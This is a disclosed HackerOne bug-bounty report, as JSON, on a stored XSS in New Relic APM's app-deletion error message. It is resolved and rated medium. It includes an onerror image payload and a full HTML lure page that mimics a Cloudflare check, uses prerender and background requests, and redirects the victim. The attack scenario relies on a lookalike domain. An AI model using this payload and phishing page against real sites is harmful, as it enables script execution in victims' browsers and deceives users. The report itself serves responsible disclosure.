{
  "id": 530871,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MzA4NzE=",
  "url": "https://hackerone.com/reports/530871",
  "title": "Stored XSS firing if the error occurs when trying to delete the APM app",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-04-07T22:57:01.823Z",
  "submitted_at": "2019-04-07T22:57:01.823Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skavans",
    "url": "/skavans",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17011,
    "url": "https://hackerone.com/newrelic",
    "handle": "newrelic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "New Relic",
      "twitter_handle": "newrelic",
      "website": "https://newrelic.com",
      "about": "New Relic's Coordinated Disclosure Program"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-08-13T10:46:00.201Z",
  "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:31:37.772Z",
  "team_member_agreed_on_going_public_at": "2020-08-13T10:46:00.081Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hey team,\n\nI have discovered that when the user tries to delete the APM app and some error occurs, the error message contains the app's name, which is not sanitized properly. So the XSS is possible there under certain circumstances.\n\nThe XSS payload is absolutely simple here, it can be like e.g. `<img src=x onerror=alert()>`.\nThe main difficulty is to craft the circumstances when the user tries to delete an app and the error occurs. It means the user *should have the possibility* to delete an app (the gear icon should be visible near the app), but *the deletion process should fails* after victim clicks \"delete\".\n\nWhen I investigated this, I discovered at least 2 ways to reach this behavior:\n1. The first one is when the user opens the apps listing having the rights to delete an app, but before he clicks the \"delete\" button, his role is changed to \"User\" and the request fails with 403 after that. \n2. The second one is when the user opens the apps listing when the app is disabled (non-active) and before he clicks the \"delete\" button, the app activates so the APM forbids to delete it.\n\nThe case #1 is quite difficult to be exploited because the attacker should have at least \"admin\" role to change the victim's role so he can attack other admins or users and the impact is quite a low in such case.\nThe case #2 is more juicy because it is only needed to create a new app so the **attacker can be simple \"user\"** here.\n\nThe case #2 can have an attack scenario like the following:\n1. Attacker (user) creates new app with malicious name\n2. Attacker craft a malicious page that sends requests to the app to activate it and then redirect the visitor to apps listing page\n3. Attacker places the malicious page at the some domain which is looks like real \"newrelic.com\"\n4. Attacker sends the link to malicious page (e.g. `http://nnnewrelic.com/accounts/123/applications`) to admin and asks him to delete the app as if it was accidentally added.\n5. Admin clicks the link. Here I used the `prerender` browser directive (`<link rel=\"prerender\" href=\"https://rpm.newrelic.com/accounts/2302015/applications\">`) that force browser to load and render some page in a hidden tab, so the real apps listing is rendered at the background.\n6. After the apps listing is loaded (the app is available for deleting still there), the malicious page sends the requests to app so the app becomes active.\n7. The victim is redirected to real apps listing (but the prerendered one, so the gear button is still there).\n8. Victim (admin) tries to delete an app but the error occurs, and the payload fires.\n\nThe PoC video demonstrating the scenario above is below:\n{F464192}\n\nThe code of malicious page is below:\n```html\n<html>\n<head>\n<link rel=\"prerender\" href=\"https://rpm.newrelic.com/accounts/2302015/applications\">\n<title>Just a moment...</title>\n<link rel=\"stylesheet\" media=\"screen\" href=\"/cdn-cgi/styles/js-challenge/error.css\" type=\"text/css\">\n</head>\n<body>\n<table width=\"100%\" height=\"100%\" cellpadding=\"30\">\n<tr>\n<td align=\"center\" valign=\"center\">\n<h1>Checking your browser before accessing newrelic.com.</h1>\n<noscript>\n<h1 style=\"color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1>\n</noscript>\n<div id=\"challenge\">\n<p>This process is automatic. Your browser will redirect to your requested content shortly.</p>\n<p>Please allow up to 5 seconds...</p>\n<img src=\"https://cdnjs.cloudflare.com/ajax/libs/galleriffic/2.0.1/css/loader.gif\" style=\"margin: 40px 0 30px 0;\"/>\n</div>\n<div style=\"margin-top:20px;\">\n<a href=\"#\" target=\"_blank\" style=\"font-size: 12px;\">DDoS protection by CloudFlare</a>\n</div>\n<div style=\"display:none\" id=\"invisible\">\n</div>\n</td>\n</tr>\n</table>\n<script>\n        function fetchApp() {\n                document.getElementById('invisible').innerHTML += '<img src=\"http://gitlab.bb:8000\">';\n        }\n        setInterval(fetchApp, 500);\n        function redirect() {\n                window.location.href=\"https://rpm.newrelic.com/accounts/2302015/applications\";\n        }\n        setTimeout(redirect, 10000);\n</script>\n</body>\n</html>\n```\n\nThe `prerender` directive works at last IE only for now, but I think there can be some other scenarios but I haven't researched it more deeply. So the payload works at every browser, but the most convenient way to attack the user with as few as possible user interactions is to use IE and `prerender` link directive.\n\n###Steps to reproduce\nIt is much easier to demonstrate the vulnerability presence (technically) using admin-to-admin attack, but the real case can be user-to-admin one, as I showed above.\n1. Sign into the APM with admin account (victim)\n2. Sign into the APM with another admin account (attacker)\n3. Set some inactive app's name to `<img src='x' onerror='alert()'>`\n4. Navigate to the apps listing as victim\n5. Change the victim's role to \"User\" as attacker\n6. Try to delete the malicious app as victim and make sure the XSS alert box is popped up.\n{F464173}\n\n## Impact\n\nAttacker can execute arbitrary JS-code at the victim's browser.",
  "weakness": {
    "id": 62,
    "name": "Cross-site Scripting (XSS) - Stored"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 464173,
      "file_name": "______________2019-04-08___0.24.37.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/464/173/3f776afc32e915f2be0ceb3d82e035d50e4ea78d/______________2019-04-08___0.24.37.png?response-content-disposition=attachment%3B%20filename%3D%22______________2019-04-08___0.24.37.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-04-08___0.24.37.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132055Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=31f29073d699ac124b72ad1d458ba56ec9140b4d85f5698da421e28988290085",
      "file_size": 328349,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 464192,
      "file_name": "newrelic_xss_remove_app.mp4",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/464/192/1c5116ededafe33649848386f3c256005089d399/newrelic_xss_remove_app.mp4?response-content-disposition=attachment%3B%20filename%3D%22newrelic_xss_remove_app.mp4%22%3B%20filename%2A%3DUTF-8%27%27newrelic_xss_remove_app.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132055Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=964851f591c1d46d2edc2d1c99dd741cc3ba8839bb158fbded521612e3957d50",
      "file_size": 952778,
      "type": "video/mp4",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-09-10T09:31:37.862Z",
  "allow_singular_disclosure_after": -108100157.86719395,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "wi11",
    "ali",
    "pacmanx",
    "cryptographer"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18678,
    "asset_type": "URL",
    "asset_identifier": "rpm.newrelic.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
